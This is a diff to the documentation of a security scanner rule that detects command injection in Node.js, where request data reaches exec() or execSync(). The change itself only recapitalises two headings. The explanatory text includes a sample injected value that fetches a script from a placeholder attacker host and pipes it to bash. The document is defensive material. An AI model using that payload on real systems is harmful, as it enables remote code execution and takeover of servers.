@@ -27,13 +27,13 @@ generated: true
 
 This rule detects cases where user-supplied request data (`req.*` or `request.*`) is passed directly to `exec()`, `execSync()`, or the fully qualified `child_process.exec()` / `child_process.execSync()`. It also detects template literal interpolation in those calls (`` exec(`...${...}`) ``). While VNX-NODE-003 catches dangerous string construction patterns, this rule focuses specifically on direct user-input injection, the most immediately exploitable form of command injection. This is CWE-78 (Improper Neutralization of Special Elements used in an OS Command).
 
-## Why This Matters
+## Why this matters
 
 When user input flows directly into `exec()`, an attacker only needs to include a shell metacharacter to inject additional commands. A value like `; curl https://attacker.com/shell.sh | bash` appended to any command gives the attacker an interactive reverse shell running as the Node.js process user. There is no escaping function that reliably prevents this, the only safe approach is to avoid `exec()` with user data entirely.
 
 The critical severity reflects that exploitation requires no special conditions or privileges: a single HTTP request with a crafted parameter is sufficient. Real-world exploits of this pattern are common against utilities that wrap CLI tools: file conversion, image processing, email sending, git operations, reporting, and any feature that shells out to a system command.
 
-## What Gets Flagged
+## What gets flagged
 
 The command string (or the `sh -c` script) must come from the request, on the same line or through a variable assigned from it a few lines above, and the call must resolve to a shell-running API.
 
